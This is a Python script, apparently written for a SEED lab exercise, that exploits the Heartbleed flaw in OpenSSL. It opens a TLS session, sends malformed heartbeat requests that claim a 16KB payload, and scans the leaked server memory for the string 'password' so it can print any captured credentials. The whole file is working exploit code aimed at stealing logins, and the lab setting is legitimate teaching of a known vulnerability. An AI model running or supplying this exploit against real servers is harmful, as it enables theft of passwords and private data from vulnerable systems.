import socket
import time

# --- TARGET CONFIGURATION ---
# Replace with the actual IP of your SEED virtual machine
TARGET_IP = "192.168...."
PORT = 443

# --- TLS CLIENT HELLO PACKET ---
# This is a minimal handshake packet. OpenSSL won't respond to a Heartbeat
# unless a TLS session is first initiated. This "introduces" the client to the server.
client_hello = (
    b"\x16\x03\x02\x00\x31\x01\x00\x00\x2d\x03\x02\x50\x0b\xaf\xbb\xb7"
    b"\x5a\x02\x3b\xfd\xc0\xff\x01\xad\x02\x42\x28\x91\xd1\x39\x69\x6a"
    b"\x28\x1a\x12\x60\x07\x3c\xed\xac\xfc\x3f\xfc\x00\x00\x04\x00\x33"
    b"\x00\xff\x01\x00\x00\x00"
)

# --- MALFORMED HEARTBEAT PAYLOAD ---
# \x18: Content Type (Heartbeat)
# \x03\x02: TLS Version 1.1
# \x00\x03: Packet Length
# \x01: Heartbeat Message Type (Request)
# \x40\x00: THIS IS THE EXPLOIT. We claim the payload is 16384 bytes (16KB), 
# but we provide no actual data. The server will copy 16KB of its own RAM to "respond".
hb_payload = b"\x18\x03\x02\x00\x03\x01\x40\x00"

def pwn_heartbleed_v3():
    """Main function to execute the Heartbleed vulnerability scan."""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(3) # Ensure the script doesn't hang forever
    
    try:
        print(f"[*] Connecting to {TARGET_IP}:{PORT}...")
        s.connect((TARGET_IP, PORT))
        
        # Step 1: Establish the TLS session
        print("[*] Sending Client Hello to initiate session...")
        s.send(client_hello)
        time.sleep(0.5)
        # Flush the buffer (receive the Server Hello/Certificate)
        s.recv(4096) 

        # Step 2: Begin the Heartbeat bombardment
        print("[*] Starting Heartbeat bombardment (5 attempts)...")
        for i in range(5):
            print(f"  [>] Attempt {i+1}...")
            s.send(hb_payload)
            
            try:
                # Attempt to receive the leaked memory chunk
                response = s.recv(16384)
                if not response:
                    continue
                
                # Check if the captured memory contains the string 'password'
                if b"password" in response:
                    print("\n" + "="*30)
                    print("[!!!] PASSWORD INTERCEPTED!")
                    print("="*30)
                    
                    # Decode the raw bytes into readable ASCII text
                    # 'ignore' skips binary characters that can't be printed
                    print(response.decode('ascii', errors='ignore'))
                    return # Exit immediately after finding the credentials
                
            except socket.timeout:
                print("  [-] Timeout on this attempt.")
            
            # Short pause to prevent crashing the server or flooding the network
            time.sleep(0.2) 

        print("\n[-] Password not caught in this round. Try clicking 'Login' faster.")

    except Exception as e:
        print(f"[-] Connection Error: {e}")
    finally:
        # Properly close the socket connection
        s.close()

if __name__ == "__main__":
    pwn_heartbleed_v3()
